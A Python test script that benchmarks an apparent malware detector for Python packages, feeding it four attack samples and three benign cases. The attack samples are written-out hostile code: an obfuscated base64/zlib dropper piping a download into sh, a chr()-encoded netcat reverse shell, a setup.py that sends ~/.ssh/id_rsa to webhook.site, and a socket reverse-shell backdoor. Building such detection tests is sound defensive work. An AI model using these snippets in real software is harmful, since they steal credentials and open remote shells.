"""Phase 4 Reality Verification Benchmark.

Tests 4 attack scenarios and 3 benign scenarios to prove:
  - True Positive detection for real-world evasion techniques
  - 0% False Positive rate on legitimate repos and harmless encoded data

Run:  .venv\\Scripts\\python.exe verify_phase4_reality.py
"""
from __future__ import annotations

import base64
import io
import json
import os
import sys
import textwrap
import time
import traceback
import zipfile
import zlib

# Ensure project root is on path
sys.path.insert(0, os.path.dirname(__file__))

from malware_proof import (
    _classify_decoded_payload,
    _try_decode_blob,
    run_pep578_audit_sandbox,
    scan_ast_deobfuscation,
    verify_release_integrity,
)

# ----------------------------------------------------------------------
# Helpers
# ----------------------------------------------------------------------
_results: list[dict] = []


def _url_fn(f, ln):
    return f"test://{f}#L{ln}"


def _record(name: str, passed: bool, detail: str = ""):
    _results.append({"name": name, "passed": passed, "detail": detail})
    status = "PASS" if passed else "FAIL"
    print(f"  [{status}] {name}")
    if detail:
        for line in detail.strip().splitlines():
            print(f"           {line}")


# ----------------------------------------------------------------------
# ATTACK CASE 1: Multi-line double-encoded dropper
# ----------------------------------------------------------------------
def test_attack1_multiline_dropper():
    """setup.py reads README.md first, then decodes multi-line base64+zlib payload in exec()."""
    malicious_plaintext = 'import os, socket, subprocess; os.system("curl http://198.51.100.42/sh | sh")'
    compressed = zlib.compress(malicious_plaintext.encode())
    encoded = base64.b64encode(compressed).decode()

    # Split encoded payload across multiple lines via string concatenation
    mid = len(encoded) // 2
    part1 = encoded[:mid]
    part2 = encoded[mid:]

    setup_code = textwrap.dedent(f'''\
        import base64, zlib
        # Legitimate-looking preamble
        readme = open("README.md").read()
        version = "1.0.0"

        payload = (
            "{part1}"
            "{part2}"
        )
        exec(zlib.decompress(base64.b64decode(payload)).decode())
    ''')

    text_files = {"setup.py": setup_code}

    # Test Layer 1 AST deobfuscation
    l1 = scan_ast_deobfuscation(text_files, _url_fn)
    l1_found = len(l1["findings"]) > 0
    l1_detail = ""
    if l1_found:
        l1_detail = f"Layer 1 decoded: {l1['findings'][0].get('detail', '')[:120]}"

    # Test Layer 2 sandbox (README.md doesn't exist, should NOT crash)
    l2 = run_pep578_audit_sandbox(text_files, _url_fn)
    l2_ran = l2["ran"]
    l2_intercepted = len(l2["intercepted"]) > 0

    passed = l1_found and l2_ran
    detail_parts = []
    if l1_found:
        detail_parts.append("Layer 1: DETECTED multi-line payload")
    else:
        detail_parts.append("Layer 1: MISSED multi-line payload")
    if l2_ran:
        detail_parts.append(f"Layer 2: Sandbox ran successfully (intercepted={l2_intercepted})")
    else:
        detail_parts.append("Layer 2: Sandbox FAILED to run (README.md crash?)")
    if l1_detail:
        detail_parts.append(l1_detail)

    _record("Attack 1: Multi-line double-encoded dropper", passed, "\n".join(detail_parts))


# ----------------------------------------------------------------------
# ATTACK CASE 2: chr() chain obfuscation
# ----------------------------------------------------------------------
def test_attack2_chr_chain():
    """Build malicious string via eval(chr()+chr()+...) spanning many characters."""
    malicious = "import os; os.system('nc -e /bin/sh 10.0.0.1 4444')"
    chr_chain = "+".join(f"chr({ord(c)})" for c in malicious)
    code = f"eval({chr_chain})\n"

    text_files = {"evil.py": code}
    l1 = scan_ast_deobfuscation(text_files, _url_fn)
    found = len(l1["findings"]) > 0

    detail = ""
    if found:
        detail = f"Decoded preview: {l1['findings'][0].get('detail', '')[:120]}"
    else:
        detail = "Layer 1 MISSED chr() chain payload"

    _record("Attack 2: chr() chain obfuscation", found, detail)


# ----------------------------------------------------------------------
# ATTACK CASE 3: Credential theft in setup.py
# ----------------------------------------------------------------------
def test_attack3_credential_theft():
    """setup.py reads ~/.ssh/id_rsa and exfiltrates via urllib."""
    code = textwrap.dedent('''\
        import os
        import urllib.request
        from pathlib import Path

        key = Path(os.path.expanduser("~/.ssh/id_rsa")).read_text()
        urllib.request.urlopen("https://webhook.site/test", data=key.encode())
    ''')

    text_files = {"setup.py": code}
    l2 = run_pep578_audit_sandbox(text_files, _url_fn)

    blocked_events = [e for e in l2.get("intercepted", []) if e.get("blocked")]
    ssh_blocked = any(".ssh" in str(e.get("args", "")) for e in blocked_events)
    any_blocked = len(blocked_events) > 0

    detail_parts = []
    if any_blocked:
        for ev in blocked_events[:3]:
            detail_parts.append(f"Blocked: {ev['event']} -> {ev['args'][:80]}")
    else:
        detail_parts.append("No events were blocked!")

    _record(
        "Attack 3: Credential theft in setup.py",
        any_blocked,
        "\n".join(detail_parts)
    )


# ----------------------------------------------------------------------
# ATTACK CASE 4: Phantom backdoor injection (Layer 4)
# ----------------------------------------------------------------------
def test_attack4_phantom_backdoor():
    """Simulate verify_release_integrity where PyPI has _backdoor.py absent from GitHub."""
    # Simulate: the GitHub repo has a clean __init__.py and utils.py
    github_text_files = {
        "pyproject.toml": '[project]\nname = "test-phantom-pkg"\nversion = "0.1.0"\n',
        "__init__.py": "# clean init\n",
        "utils.py": "def helper(): pass\n",
    }
    github_py_files = {
        "__init__.py": b"# clean init\n",
        "utils.py": b"def helper(): pass\n",
    }

    # The PyPI release contains _backdoor.py with dangerous calls
    backdoor_code = textwrap.dedent('''\
        import subprocess
        import socket
        conn = socket.create_connection(("10.0.0.1", 4444))
        subprocess.Popen(["/bin/sh"], stdin=conn.fileno(), stdout=conn.fileno())
    ''')

    # We'll test the Layer 4 logic directly by mocking the PyPI download
    # Use _ast_capabilities and the classification logic
    from malware_proof import _ast_capabilities, _EXEC_CAPS, _NET_CAPS

    # Simulate what verify_release_integrity does internally for classification
    rel_caps = _ast_capabilities(backdoor_code)
    fname = "_backdoor.py"

    # Check: file absent from GitHub
    all_gh_fnames = {"__init__.py", "utils.py"}
    is_phantom = fname not in all_gh_fnames

    # Check: high-risk combo
    has_highrisk = bool(rel_caps & _EXEC_CAPS) and bool(rel_caps & _NET_CAPS)

    # Check: caps not in repo
    all_gh_caps: set[str] = set()
    for _p, raw in github_py_files.items():
        all_gh_caps.update(_ast_capabilities(raw.decode("utf-8", "ignore")))
    diff_in_repo = rel_caps.issubset(all_gh_caps)

    strong = (has_highrisk or is_phantom) and not diff_in_repo

    detail_parts = [
        f"Phantom file: {is_phantom}",
        f"High-risk exec+net combo: {has_highrisk}",
        f"Diff already in repo: {diff_in_repo}",
        f"Classified as strong=True: {strong}",
        f"Release caps: {sorted(rel_caps)}",
    ]

    _record(
        "Attack 4: Phantom backdoor injection (Layer 4)",
        strong,
        "\n".join(detail_parts)
    )


# ----------------------------------------------------------------------
# BENIGN CASE 1: Base64 PNG + benign eval (no code markers)
# ----------------------------------------------------------------------
def test_benign1_png_blob():
    """A .py file with a 400-byte base64-encoded PNG header and benign JSON config."""
    # Real PNG header bytes (first ~50 bytes of a PNG)
    png_header = (
        b"\x89PNG\r\n\x1a\n"
        b"\x00\x00\x00\rIHDR"
        b"\x00\x00\x01\x00\x00\x00\x01\x00"
        b"\x08\x06\x00\x00\x00"
        + b"\x00" * 380
    )
    png_b64 = base64.b64encode(png_header).decode()

    # Normal JSON config (not malicious)
    json_config = base64.b64encode(b'{"debug": false, "version": "2.1.0", "output_dir": "/tmp/results"}').decode()

    code = textwrap.dedent(f'''\
        import base64
        # Embedded PNG icon for the GUI
        ICON_DATA = base64.b64decode("{png_b64}")
        # Config loaded from encoded string
        CONFIG = base64.b64decode("{json_config}")
        result = eval("2 + 2")  # simple arithmetic eval
    ''')

    text_files = {"gui_assets.py": code}
    l1 = scan_ast_deobfuscation(text_files, _url_fn)

    num_findings = len(l1["findings"])
    benign_count = l1["benign_ignored"]

    detail = f"Findings: {num_findings}, Benign blobs filtered: {benign_count}"
    _record(
        "Benign 1: Base64 PNG + JSON config (0 findings expected)",
        num_findings == 0,
        detail
    )


# ----------------------------------------------------------------------
# BENIGN CASE 2: Legitimate setup.py reading README.md + version.py
# ----------------------------------------------------------------------
def test_benign2_legit_setup():
    """Standard setup.py that reads README.md and uses re.search for version."""
    code = textwrap.dedent('''\
        import re
        from pathlib import Path

        readme = Path("README.md").read_text(encoding="utf-8")

        with open("version.py") as f:
            version = re.search(r'^__version__\\s*=\\s*["\\'](.*?)["\\']', f.read(), re.M).group(1)

        from setuptools import setup, find_packages
        setup(
            name="my-legit-package",
            version=version,
            long_description=readme,
            packages=find_packages(),
        )
    ''')

    text_files = {"setup.py": code}
    l2 = run_pep578_audit_sandbox(text_files, _url_fn)

    blocked = [e for e in l2.get("intercepted", []) if e.get("blocked")]
    num_blocked = len(blocked)

    detail_parts = [f"Sandbox ran: {l2['ran']}", f"Blocked events: {num_blocked}"]
    if blocked:
        for ev in blocked[:3]:
            detail_parts.append(f"  Unexpected block: {ev['event']} -> {ev.get('args', '')[:60]}")

    _record(
        "Benign 2: Legitimate setup.py (0 findings expected)",
        l2["ran"] and num_blocked == 0,
        "\n".join(detail_parts)
    )


# ----------------------------------------------------------------------
# BENIGN CASE 3: Live real-world repo torture check
# ----------------------------------------------------------------------
def test_benign3_real_repos():
    """Run full scan_repo() on 5 diverse real-world GitHub repos and assert verified_malware == 0."""
    from github_client import GitHubClient
    from repo_scan import scan_repo

    token = os.getenv("GITHUB_TOKEN", "")
    client = GitHubClient(token=token if token else None)

    repos = [
        ("psf", "requests"),
        ("pallets", "flask"),
        ("pallets-eco", "blinker"),
        ("ahupp", "python-magic"),
        ("mitsuhiko", "minijinja"),
    ]

    all_clean = True
    detail_parts = []

    for owner, repo in repos:
        try:
            t0 = time.time()
            result = scan_repo(client, owner, repo)
            elapsed = time.time() - t0
            vm = result.get("verified_malware", 0)
            clean = vm == 0
            if not clean:
                all_clean = False
            status = "CLEAN" if clean else f"FLAGGED ({vm} verified_malware)"
            detail_parts.append(f"  {owner}/{repo}: {status} ({elapsed:.1f}s)")

            # Show any strong findings for debugging
            if not clean:
                proof = result.get("malware_proof", {})
                for f in (proof.get("findings", []) if proof else []):
                    if f.get("strong"):
                        detail_parts.append(f"    -> {f['source']}: {f['rule']}")
        except Exception as e:
            detail_parts.append(f"  {owner}/{repo}: ERROR ({type(e).__name__}: {e})")
            # Don't fail the test on network errors
            if "rate" in str(e).lower() or "404" in str(e) or "403" in str(e):
                detail_parts.append(f"    (Skipping due to API limit/access issue)")
            else:
                all_clean = False

    _record(
        "Benign 3: Live real-world repos (0 verified_malware each)",
        all_clean,
        "\n".join(detail_parts)
    )


# ----------------------------------------------------------------------
# MAIN
# ----------------------------------------------------------------------
def main():
    print("=" * 72)
    print("  Phase 4 Reality Verification Benchmark")
    print("=" * 72)

    print("\n-- Attack Cases (must detect) --")
    test_attack1_multiline_dropper()
    test_attack2_chr_chain()
    test_attack3_credential_theft()
    test_attack4_phantom_backdoor()

    print("\n-- Benign Cases (must NOT flag) --")
    test_benign1_png_blob()
    test_benign2_legit_setup()
    test_benign3_real_repos()

    # Summary table
    print("\n" + "=" * 72)
    print(f"  {'Test Case':<58} {'Result':>8}")
    print("-" * 72)
    passed = 0
    failed = 0
    for r in _results:
        status = "PASS" if r["passed"] else "FAIL"
        print(f"  {r['name']:<58} {status:>8}")
        if r["passed"]:
            passed += 1
        else:
            failed += 1
    print("-" * 72)
    print(f"  Total: {passed} passed, {failed} failed out of {len(_results)}")
    print("=" * 72)

    if failed:
        print("\n!! SOME TESTS FAILED. Review the output above.")
        sys.exit(1)
    else:
        print("\nOK: ALL TESTS PASSED. Phase 4 hardening verified.")
        sys.exit(0)


if __name__ == "__main__":
    main()
